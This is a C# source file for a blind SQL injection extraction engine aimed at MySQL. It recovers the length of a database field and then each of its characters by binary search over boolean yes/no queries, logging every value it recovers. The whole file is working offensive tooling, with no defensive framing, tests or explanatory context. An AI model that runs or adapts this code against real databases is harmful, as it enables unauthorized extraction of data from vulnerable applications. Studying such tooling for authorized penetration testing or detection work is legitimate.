using System;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging;


namespace PeterJuhasz.SqlInjection
{
    using static MySqlFunctions;

    public class BlindSqlInjection
    {
        public BlindSqlInjection(
            ILogger<BlindSqlInjection> logger,
            IHypothesisTester hypothesisTester
        )
        {
            Logger = logger;
            HypothesisTester = hypothesisTester;
            Context = new MySqlInjectionContext(this);
        }

        protected ILogger Logger { get; }

        public IHypothesisTester HypothesisTester { get; }
        public MySqlInjectionContext Context { get; }
        

        public async Task<string> GetExpressionValueUsingBinarySearchAsync(
            IQueryable<string> query,
            char minimum, char maximum,
            int estimatedLength = 24,
            string continuationToken = "",
            CancellationToken cancellationToken = default
        )
        {
            Logger.LogTrace($"Determining length...");
            int length = await query.Select(e => Length(e)).Take(1).FirstAsync(estimatedLength);
            Logger.LogTrace($"Field length: {length}");

            string partialResult = continuationToken;

            for (int i = continuationToken.Length; i < length; i++)
            {
                cancellationToken.ThrowIfCancellationRequested();

                var @char = (char)await GetExpressionValueUsingBinarySearchAsync(query.Select(e => Ascii(Substring(e, partialResult.Length + 1, 1))).Take(1), minimum, maximum);
                
                partialResult += @char;
                Logger.LogTrace($"Found new piece '{@char}' (0x{@char.ToHex()}), partial result: '{partialResult}'");
            }

            Logger.LogCritical($"Found field value '{partialResult}' (0x{partialResult.ToHex()})");
            return partialResult;
        }

        public Task<string> GetExpressionValueUsingBinarySearchAsync(
            IQueryable<string> query,
            int estimatedLength = 24,
            string continuationToken = "",
            CancellationToken cancellationToken = default
        ) =>
            GetExpressionValueUsingBinarySearchAsync(query, minimum: (char)0x20, maximum: (char)0xFF, estimatedLength, continuationToken, cancellationToken);

        public async Task<int> GetExpressionValueUsingBinarySearchAsync(
            IQueryable<int> query,
            int minimum, int maximum,
            CancellationToken cancellationToken = default
        )
        {
            int adjustedMinimum = minimum,
                adjustedMaximum = maximum;

            while (true)
            {
                Logger.LogTrace($"Testing window [{adjustedMinimum}, {adjustedMaximum}]...");
                int mean = adjustedMinimum + (adjustedMaximum - adjustedMinimum) / 2;

                if (adjustedMinimum == adjustedMaximum)
                    return adjustedMinimum;

                if (adjustedMaximum - adjustedMinimum == 1)
                {
                    if (await query.Select(e => e == adjustedMinimum).FirstAsync())
                        return adjustedMinimum;

                    if (adjustedMaximum < maximum)
                        return adjustedMaximum;
                    else
                    {
                        if (await query.Select(e => e == adjustedMaximum).FirstAsync())
                            return adjustedMaximum;
                    }

                    throw new InvalidOperationException($"Could not find value.");
                }

                if (await query.Select(e => e.Between(adjustedMinimum, mean)).FirstAsync())
                {
                    adjustedMaximum = mean;

                    if (mean == adjustedMinimum)
                        return mean;
                }
                else
                {
                    adjustedMinimum = mean + 1;
                }
            }
        }

        public Task<int> GetExpressionValueUsingBinarySearchAsync(
            IQueryable<int> query,
            int estimation = 1000,
            CancellationToken cancellationToken = default
        ) =>
            GetExpressionValueUsingBinarySearchAsync(query, 0, estimation * 2, cancellationToken);
    }
}
